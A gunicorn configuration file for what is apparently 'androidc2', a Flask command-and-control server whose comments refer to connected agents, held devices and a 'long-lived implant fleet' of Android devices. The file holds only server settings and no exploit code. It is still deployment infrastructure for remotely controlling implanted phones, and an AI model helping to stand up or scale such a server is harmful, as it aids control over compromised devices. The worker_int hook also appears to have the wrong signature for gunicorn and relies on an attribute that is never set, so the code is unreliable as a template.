"""Gunicorn configuration.

Run:
    gunicorn -c deploy/gunicorn.conf.py 'app:create_app()'

Why gthread + threads instead of the Flask dev server:

* The Werkzeug dev server logs a spurious
  ``AssertionError: write() before start_response`` for *every* WebSocket
  that closes. ``simple-websocket`` takes over the raw socket, then Werkzeug
  finalises a response cycle that never started. Purely cosmetic — but it
  fills the log with 500s that look like a broken tunnel.
* Threads, not gevent. gevent ships no cp313 wheels, so installing it falls
  back to a source build whose bundled Cython fails on
  ``undeclared name not builtin: long``. ``simple-websocket`` (already
  required above) gives WebSocket support on plain threads.

One worker, many threads. Do **not** scale workers with ``-w N``: the
connected-agent registry lives in process memory (``c2/agent_ws._agents``),
so a second worker would not see devices held by the first. Moving that
registry to Redis is the prerequisite for scaling out — see README.
"""

import multiprocessing
import os

bind = os.environ.get("C2_BIND", "127.0.0.1:5000")

# Single worker, many threads: see module docstring. Threads give concurrent
# WebSocket handling without a compiled dependency.
workers = 1
worker_class = "gthread"
threads = int(os.environ.get("C2_THREADS", "100"))

# Keep the connection alive well past any tunnel/NAT idle timeout.
timeout = 120
graceful_timeout = 30
keepalive = 65

# Recycle periodically so a long-lived implant fleet cannot pin a bad memory
# growth in the process forever.
max_requests = 10000
max_requests_jitter = 1000

# No gunicorn access log: c2/logs.py emits one structured line per request,
# already carrying method, path, status, duration, ip and request id. Two
# access logs would be noise, and this one has none of those fields.
accesslog = None
errorlog = "-"
# Werkzeug's per-request lines are silenced inside c2/logs.configure().
loglevel = os.environ.get("C2_LOG_LEVEL", "info")

proc_name = "androidc2"

preload_app = False       # Config reads env at import; do not fork-share it


def when_ready(server):
    server.log.info("androidc2 ready on %s (workers=%d threads=%d)",
                    bind, workers, threads)


def worker_int(prev_pid, prev_worker):
    server = getattr(worker_int, "_server", None)
    if server:
        server.log.info("worker %s interrupted, draining sockets", prev_pid)